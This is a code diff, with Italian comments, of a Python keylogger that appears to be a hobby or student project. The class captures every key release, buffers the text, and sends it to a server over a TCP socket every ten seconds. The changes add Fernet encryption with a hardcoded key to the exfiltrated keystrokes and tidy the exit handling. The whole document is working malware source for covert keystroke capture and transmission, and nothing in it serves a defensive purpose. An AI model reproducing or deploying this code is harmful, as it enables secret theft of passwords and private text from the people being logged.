@@ -2,10 +2,13 @@ import keyboard # per registrare la pressione dei tasti, fa anche altro..
 from threading import Timer # per il timer che ogni tot secondi fa un operazione
 from datetime import datetime
 from socket import *
+from cryptography.fernet import Fernet
 
-SERVER_NAME = 'localhost'
-SERVER_PORT = 12000
-LOG_INTERVAL = 30 # in secondi
+SERVER = 'localhost'
+PORT = 12345
+LOG_INTERVAL = 10 # in secondi
+
+KEY = b'6717Ub-YB8Brvn2bnarriTULPLKpIcLhveFbsQ6okhM='
 
 class Keylogger:
     def __init__(self, interval):
@@ -38,24 +41,31 @@ class Keylogger:
         if self.log: # se c'è qualcosa nel buffer lo invio
             try:
                 self.send_log()
+                self.log = ""
             except:
                 exit(1)
             
-        self.log = ""
+        
         timer = Timer(interval=self.interval, function=self.report)
         timer.daemon = True #imposto il thread come demone (muore quando il thread principale muore)
         timer.start() # faccio partire il timer
 
     def send_log(self):
         clientSocket = socket(AF_INET, SOCK_STREAM)
-        clientSocket.connect((SERVER_NAME, SERVER_PORT))
-        clientSocket.send((self.log).encode())
+        clientSocket.connect((SERVER, PORT))
+        fernet = Fernet(KEY)
+        encMessage = fernet.encrypt((self.log).encode())
+        print(encMessage)
+        clientSocket.send(encMessage)
         clientSocket.close()
 
     def start(self):
-        keyboard.on_release(callback=self.callback) # faccio partire il keylogger
-        self.report() # inizio a loggare i tasti premuti
-        keyboard.wait() # blocco il thread corrente, aspetta che CTRL+C venga premuto
+        try:
+            keyboard.on_release(callback=self.callback) # faccio partire il keylogger
+            self.report() # inizio a loggare i tasti premuti
+            keyboard.wait() # blocco il thread corrente, aspetta che CTRL+C venga premuto
+        except KeyboardInterrupt:
+            print("\n[-] Received exit, exiting")
 
 if __name__ == "__main__":
     keylogger = Keylogger(interval=LOG_INTERVAL)
